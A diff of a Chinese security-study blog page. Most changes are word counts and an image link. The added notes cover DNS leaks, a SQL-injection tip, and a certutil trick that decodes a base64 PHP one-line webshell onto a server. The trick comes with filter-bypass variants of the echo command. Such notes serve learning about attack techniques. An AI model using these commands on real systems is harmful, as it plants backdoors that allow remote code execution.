@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">5.9k</span>
+            <span class="post-count">6.2k</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">21 分钟</span>
+            <span class="post-count">22 分钟</span>
         </span>
     </span>
 </div>
@@ -355,7 +355,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">我先回顾一下：</span><br><span class="line">1.我在浏览器输入一个example.com并回车</span><br><span class="line">2.浏览器去域名解析为对应ip</span><br><span class="line">(查找顺序:本地DNS缓存-&gt;hosts文件-&gt;本地DNS服务器(比如8.8.8.8/114.114.114.114)-&gt;根.-&gt;顶级.-&gt;权威)</span><br><span class="line">DNS具体起的作用，以四层模型为例</span><br><span class="line">应用层：由DNS去生成一个请求，类似于&quot;告诉我example.com的ip&quot; -&gt;</span><br><span class="line">传输层：源端口+目的端口封装头部</span><br><span class="line">网络层：源ip+目的ip(8.8.8.8)封装头部</span><br><span class="line">它找不到这个8.8.8.8，就去找网关，即路由器的ip,192.168.1.1</span><br><span class="line">网际层：数据链路层去头部添加源MAC+网关MAC(ARP协议)，后面也会封装一些校验值；物理层就通过网卡发送这个数据包</span><br></pre></td></tr></table></figure>
 
 <p>不行，还是要画个图</p>
-<p><img src="/../../../Typora/img111/image-20231123120737757.png" alt="图示"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231123120737757.png" alt="图示"></p>
 <p>上面的数据包已经发到交换机了，交换机就两层</p>
 <blockquote>
 <p>数据链路层</p>
@@ -398,6 +398,16 @@
 <p>当网站检测不到DNS泄露时，尝试访问google浏览器时，wireshark抓包，过滤dns，看是否发送给了ISP的DNS的包</p>
 <p><a target="_blank" rel="noopener" href="https://bulianglin.com/archives/dns.html#google_vignette">https://bulianglin.com/archives/dns.html#google_vignette</a></p>
 <p>参考：不lianglin</p>
+<h1 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h1><p>一般sql注入时，尝试输入一定存在的表段，如果回显不正常，说明站库分离</p>
+<h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><p>一般是下载证书的命令，但是呢，被滥用于恶意下载，除了下载，它还可以加解密，所以这里存在一个利用方式</p>
+<p>曾哥博客的案例是这样的</p>
+<p>首先是可以命令执行，为了getshell就可以这样子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo MTw/cGhwIGV2YWwoJF9QT1NUWyJhYWJ5c3MiXSk7ICA/PjEy &gt; &quot;base64.txt&quot;</span><br><span class="line">certutil -f -decode &quot;base64.txt&quot; &quot;webshell.txt&quot;</span><br><span class="line">copy webshell.txt webshell.php</span><br></pre></td></tr></table></figure>
+
+<p>这里之所以将一句话木马编码，是有以下情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在windows下：</span><br><span class="line"><span class="built_in">echo</span> &lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;aabyss&quot;</span>]);?&gt; &gt; <span class="string">&quot;webshell.php&quot;</span></span><br><span class="line">这种&amp; | &gt; &lt; +符号对于<span class="built_in">echo</span>语句来将报错</span><br><span class="line"></span><br><span class="line">曾哥想到</span><br><span class="line"><span class="built_in">echo</span> ^&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;aabyss&quot;</span>]);?^&gt; &gt; <span class="string">&quot;webshell.php&quot;</span> 但是^被拦截</span><br><span class="line">尝试双引号</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[&quot;</span>aabyss<span class="string">&quot;]);?&gt;&quot;</span> &gt; <span class="string">&quot;webshell.php&quot;</span></span><br><span class="line">但是文件里多了双引号，所以考虑<span class="built_in">base64</span>编码，但是编码里有+，也不能写，所以最终</span><br><span class="line">13123&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;aabyss&quot;</span>]);?&gt;123123 再编码(直到没有+为止)</span><br><span class="line">也是一种不错的bypass技巧！</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/97.html">https://blog.zgsec.cn/archives/97.html</a></p>
  
       <!-- reward -->
       
